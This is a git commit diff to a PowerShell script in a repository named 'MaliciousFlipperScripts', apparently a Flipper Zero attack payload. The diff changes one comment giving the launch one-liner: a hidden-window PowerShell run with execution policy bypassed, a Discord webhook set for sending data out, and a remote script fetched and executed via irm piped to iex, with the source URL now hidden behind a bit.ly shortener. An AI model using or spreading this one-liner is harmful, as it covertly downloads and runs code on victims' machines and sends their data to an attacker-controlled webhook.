a3b8bd7e4db4bdc75e9b62fbfb303542ffaabdfc
OverflowMyBuffers <rudydijkstra@outlook.com>
2024-03-13 14:43:00 +0100

    Shorter Url

--- AllTheFun/AllTheFun.ps1
+++ AllTheFun/AllTheFun.ps1
@@ -3,7 +3,7 @@
 
 # Some Globals
 # The Discord sending webhook
-# Example use: powershell -w h -ep bypass $discordwebhook='https://discord.com/whatever';irm https://raw.githubusercontent.com/NotAMaliciousHacker/MaliciousFlipperScripts/main/AllTheFun/AllTheFun.ps1 | iex
+# Example use: powershell -w h -ep bypass $discordwebhook='https://discord.com/whatever';irm https://bit.ly/3Phqlcc | iex
 
 function Send-DiscordWebhook {
     param (
